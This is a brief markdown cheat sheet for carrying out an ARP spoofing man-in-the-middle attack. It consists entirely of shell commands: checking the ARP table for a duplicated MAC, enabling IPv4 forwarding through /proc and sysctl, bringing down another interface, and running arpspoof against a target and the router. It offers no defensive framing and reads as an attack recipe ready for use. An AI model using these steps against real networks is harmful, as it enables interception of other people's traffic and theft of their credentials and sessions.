# ARP Spoof

## Check mac changed or not

    $ arp -a
    Interface: 192.168.1.4 --- 0x14
      Internet Address      Physical   Address      Type
      192.168.1.1             80-1f-02-e2-94-8c     dynamic
      192.168.1.13            80-1f-02-e2-94-8c     dynamic
      ...

## Check ip_forward status

    $ sysctl net.ipv4.ip_forward
    or
    $ cat /proc/sys/net/ipv4/ip_forward

## Enabling ip_forward

    $ echo 1 >> /proc/sys/net/ipv4/ip_forward
    or
    $ sysctl -w net.ipv4.ip_forward=1

## Closing other network

    $ ifconfig eth0 down

## Using arpspoof

    $ arpspoof -i wlan0 -t <target> <router>
